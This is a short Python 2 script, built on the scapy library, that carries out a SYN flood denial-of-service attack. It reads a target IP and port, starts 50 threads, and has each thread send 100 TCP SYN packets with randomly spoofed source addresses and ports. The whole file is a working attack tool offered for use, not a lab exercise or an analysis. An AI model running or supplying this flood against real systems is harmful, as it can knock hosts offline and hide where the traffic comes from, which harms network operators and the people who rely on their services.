#!/usr/bin/env python
import random
import sys
import threading
import scapy.all as scapy 
# import scapy
target       = None
port         = None
thread_limit = 50
  
class sendSYN(threading.Thread):
    global target, port
    def __init__(self):
        threading.Thread.__init__(self)
 
    def run(self):
        ip = scapy.IP()
        ip.dst = target
        tcp = scapy.TCP()
        tcp.dport = port
        tcp.flags = 'S'
        for i in range (100):
            ip.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
            tcp.sport = random.randint(1,65535)
            scapy.send(ip/tcp, verbose=0)
 
def syn_flood(target,port):
    print "Flooding %s:%i with SYN packets." % (target, port)
    for i in range(thread_limit):
        sendSYN().start()

if __name__ == "__main__":
    # Make sure we have all the arguments we need
    if len(sys.argv) != 3:
        print "Usage: %s <Target IP> <Port>" % sys.argv[0]
        exit()
    target           = sys.argv[1]
    port             = int(sys.argv[2])
    syn_flood(target,port)
